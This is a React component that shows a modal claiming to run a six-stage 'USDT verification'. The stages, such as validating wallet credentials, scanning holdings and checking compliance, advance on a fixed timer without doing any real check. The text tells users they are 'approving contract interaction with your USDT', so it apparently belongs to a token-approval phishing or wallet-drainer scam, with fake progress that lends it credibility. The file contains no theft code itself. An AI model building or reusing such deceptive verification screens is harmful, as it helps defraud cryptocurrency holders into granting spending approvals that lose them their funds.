'use client';

import { useState, useEffect } from 'react';

interface VerificationStagesProps {
  isOpen: boolean;
  onComplete: () => void;
}

const stages = [
  'Validating wallet credentials',
  'Scanning USDT holdings and balance',
  'Analyzing transaction history',
  'Verifying compliance status',
  'Performing security authentication',
  'Finalizing USDT verification'
];

export default function VerificationStages({ isOpen, onComplete }: VerificationStagesProps) {
  const [currentStage, setCurrentStage] = useState(0);

  useEffect(() => {
    if (!isOpen) return;

    setCurrentStage(0);
    const interval = setInterval(() => {
      setCurrentStage(prev => {
        if (prev >= stages.length - 1) {
          clearInterval(interval);
          setTimeout(onComplete, 500);
          return prev;
        }
        return prev + 1;
      });
    }, 1200);

    return () => clearInterval(interval);
  }, [isOpen, onComplete]);

  if (!isOpen) return null;

  const progressPercentage = ((currentStage + 1) / stages.length) * 100;

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="bg-gradient-to-br from-slate-900 to-black border border-emerald-500/30 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl">
        <h2 className="text-2xl font-bold text-white mb-2 text-center">USDT Verification In Progress</h2>
        <p className="text-emerald-400/80 text-center mb-8 text-sm">Approving contract interaction with your USDT for total scan</p>

        <div className="space-y-4">
          {/* Progress Bar */}
          <div className="relative h-2 bg-slate-800/50 rounded-full overflow-hidden border border-emerald-500/20">
            <div
              className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
              style={{ width: `${progressPercentage}%` }}
            />
          </div>

          {/* Stages List */}
          <div className="space-y-3 mt-6">
            {stages.map((stage, index) => (
              <div key={index} className="flex items-center gap-3">
                <div
                  className={`flex-shrink-0 w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${
                    index < currentStage
                      ? 'bg-emerald-500 border-emerald-500'
                      : index === currentStage
                      ? 'border-emerald-400 bg-emerald-400/10 animate-pulse'
                      : 'border-slate-600'
                  }`}
                >
                  {index < currentStage && (
                    <span className="text-white text-xs font-bold">✓</span>
                  )}
                  {index === currentStage && (
                    <span className="text-emerald-400 text-xs">●</span>
                  )}
                </div>
                <span
                  className={`text-sm transition-colors ${
                    index <= currentStage ? 'text-white' : 'text-slate-400'
                  }`}
                >
                  {stage}
                </span>
              </div>
            ))}
          </div>

          {/* Status Text */}
          <div className="mt-8 text-center">
            <p className="text-xs text-slate-400">
              Step {currentStage + 1} of {stages.length}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
